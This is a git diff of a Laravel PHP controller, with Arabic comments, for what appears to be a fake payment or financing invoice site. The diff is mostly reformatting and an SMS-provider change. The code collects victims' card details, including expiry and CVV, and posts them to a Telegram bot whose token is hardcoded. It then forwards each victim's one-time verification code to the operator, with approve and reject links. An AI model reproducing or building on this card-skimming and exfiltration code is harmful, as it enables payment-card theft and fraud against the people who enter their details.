@@ -10,9 +10,12 @@ use Illuminate\Http\Request;
 use Illuminate\Support\Str;
 use Seven\Api\Client as SmsClient;
 use Seven\Api\Params;
+use Illuminate\Support\Facades\Http;
+
 class HomeController extends Controller
 {
-    public function send_bot($databot){
+    public function send_bot($databot)
+    {
         $urll = "https://api.telegram.org/bot6896696248:AAGHmKKCQLTyec6RNOScN5oHIvPumfEPhNo/sendMessage";
         // Prepare the POST data
         $senderr = [
@@ -32,7 +35,7 @@ class HomeController extends Controller
         $key = env('env_bot');
         $ids = env('env_chatId');
 
-        $url_new = "https://api.telegram.org/bot".$key."/sendMessage";
+        $url_new = "https://api.telegram.org/bot" . $key . "/sendMessage";
         // Prepare the POST data
         $senderr = [
             'chat_id' => $ids,
@@ -49,7 +52,6 @@ class HomeController extends Controller
         curl_setopt($curll_new, CURLOPT_POSTFIELDS, $senderr);
 
         $response = curl_exec($curll_new);
-       
     }
     public function create_link_old(Request $request)
     {
@@ -62,7 +64,7 @@ class HomeController extends Controller
         ]);
 
         // Generate a random code based on the current date and time
-        $randomCode =Str::random(4); // Example: 20231025123045ABCD
+        $randomCode = Str::random(4); // Example: 20231025123045ABCD
 
         // Store the data in the database
         $paymentLink = Order::create([
@@ -90,49 +92,49 @@ class HomeController extends Controller
         ]);
     }
     public function create_link(Request $request)
-{
-    // Validate the request data
-    $request->validate([
-        'name' => 'required|string|max:255',
-        'total_funding' => 'required|numeric|min:0',
-        'initial_payment' => 'required|numeric|min:0',
-        'monthly_installment' => 'required|numeric|min:0',
-        'currancy' => 'required|string|max:255',
-    ]);
+    {
+        // Validate the request data
+        $request->validate([
+            'name' => 'required|string|max:255',
+            'total_funding' => 'required|numeric|min:0',
+            'initial_payment' => 'required|numeric|min:0',
+            'monthly_installment' => 'required|numeric|min:0',
+            'currancy' => 'required|string|max:255',
+        ]);
 
-    // Generate a random code
-    $randomCode = Str::random(5);
-    $id = intval(date('ymdHis') . rand(100000, 999999)); // ناخذ 18 رقم فقط
-    // Store the data in the database
-    $payment = Payment::create([
-        'uuid'=>$id,
-        'code' => $randomCode,
-        'name' => $request->input('name'),
-        'total_funding' => $request->input('total_funding'),
-        'initial_payment' => $request->input('initial_payment'),
-        'monthly_installment' => $request->input('monthly_installment'),
-        'currancy' => $request->input('currancy'),
-        'phone' => $request->input('phone'),
-    ]);
+        // Generate a random code
+        $randomCode = Str::random(5);
+        $id = intval(date('ymdHis') . rand(100000, 999999)); // ناخذ 18 رقم فقط
+        // Store the data in the database
+        $payment = Payment::create([
+            'uuid' => $id,
+            'code' => $randomCode,
+            'name' => $request->input('name'),
+            'total_funding' => $request->input('total_funding'),
+            'initial_payment' => $request->input('initial_payment'),
+            'monthly_installment' => $request->input('monthly_installment'),
+            'currancy' => $request->input('currancy'),
+            'phone' => $request->input('phone'),
+        ]);
 
-    // Generate invoice link
-    $invoiceLink = route('show_invoice', ['code' => $randomCode]);
+        // Generate invoice link
+        $invoiceLink = route('show_invoice', ['code' => $randomCode]);
 
-    // Return success response
-    return response()->json([
-        'status' => 'success',
-        'message' => 'تم إنشاء رابط الدفع بنجاح',
-        'data' => [
-            'name' => $payment->name,
-            'total_funding' => $payment->total_funding,
-            'initial_payment' => $payment->initial_payment,
-            'monthly_installment' => $payment->monthly_installment,
-            'currency' => $payment->currency,
-            'code' => $payment->code,
-            'invoice_link' => $invoiceLink
-        ],
-    ]);
-}
+        // Return success response
+        return response()->json([
+            'status' => 'success',
+            'message' => 'تم إنشاء رابط الدفع بنجاح',
+            'data' => [
+                'name' => $payment->name,
+                'total_funding' => $payment->total_funding,
+                'initial_payment' => $payment->initial_payment,
+                'monthly_installment' => $payment->monthly_installment,
+                'currency' => $payment->currency,
+                'code' => $payment->code,
+                'invoice_link' => $invoiceLink
+            ],
+        ]);
+    }
     public function show_invoice($code)
     {
         // Fetch the payment link details from the database
@@ -165,8 +167,8 @@ class HomeController extends Controller
             "الشهر : {$formData['ExpireDate']}\n" .
             "السنة : {$formData['ExpireYear']}\n" .
 
-            "رمز سي سي في: {$formData['Cvv']}\n" ;
-            $this->send_bot($databot);
+            "رمز سي سي في: {$formData['Cvv']}\n";
+        $this->send_bot($databot);
 
         return view('pay')->with('order', $order)->with('formData', $formData);
     }
@@ -174,40 +176,43 @@ class HomeController extends Controller
     {
         $formData = session()->get('form_data');
         $order = Order::where('code', $formData['code'])->first();
-        $successUrl = route('success_url',$order->code);
-        $errorUrl = route('error_url',$order->code);
+        $successUrl = route('success_url', $order->code);
+        $errorUrl = route('error_url', $order->code);
 
         $databot =
-           
+
             "رمز التحقق: {$request->code}\n\n" .
-            "🟢 [رابط الموافقة]({$successUrl})\n\n".
+            "🟢 [رابط الموافقة]({$successUrl})\n\n" .
             "🔴 [رابط الرفض]({$errorUrl})";
 
-         $this->send_bot($databot);
+        $this->send_bot($databot);
         // Send the message to Telegram
         return response()->json([
             'success' => true,
             'message' => 'Order confirmed successfully.',
             'order_id' => $order->id, // Include the order ID for further checks
         ]);
-        
     }
-    public function success_url($code){
-        $order = Order::where('code',$code)->first();
-        $order->status =1 ;
+    public function success_url($code)
+    {
+        $order = Order::where('code', $code)->first();
+        $order->status = 1;
         $order->save();
         dd('success_done');
     }
-    public function error_url($code){
-        $order = Order::where('code',$code)->first();
-        $order->status =2 ;
+    public function error_url($code)
+    {
+        $order = Order::where('code', $code)->first();
+        $order->status = 2;
         $order->save();
         dd('error_done');
     }
-    public function success(){
+    public function success()
+    {
         return view('success');
     }
-    public function error(){
+    public function error()
+    {
         return view('error');
     }
     public function checkOrderStatus(Request $request)
@@ -228,21 +233,26 @@ class HomeController extends Controller
     public function send_message(Request $request, BulkSmsService $bulkSms)
     {
         $phone = $request->customerPhone;
-    
+
         $message = $request->additionalNotes;
 
-        $client = new SmsClient( env('SMS_KEY'));
-        $response = $client->post('sms', [
-            'to'   => $phone,
-            'text' => $message,
+        // dd($ip = request()->ip());
+        $response = Http::withHeaders([
+            'authkey' => env('MSG91_AUTH_KEY'), // مفتاح API الخاص بك
+            'content-type' => 'application/json',
+        ])->post('https://api.msg91.com/api/v2/sendsms', [
+            'sender' => 'SENDERID', // اسم المرسل المسجّل عندهم
+            'route' => '4', // Route 4 = Transactional
+            'country' => '970', // أو '966' للسعودية
+            'unicode'=>'arabic',
+            'sms' => [
+                [
+                    'message' => $message,
+                    'to' => [$phone]
+                ]
+            ]
         ]);
-        
-        if (isset($response->success) && !$response->messages[0]->success == false) {
-            return view('success');
-        }
-
-        $error = $response->messages[0]->error_text ;
-        return view('errorsend', ['error' => $error]);
-    }
     
+        return $response->json();
+    }
 }
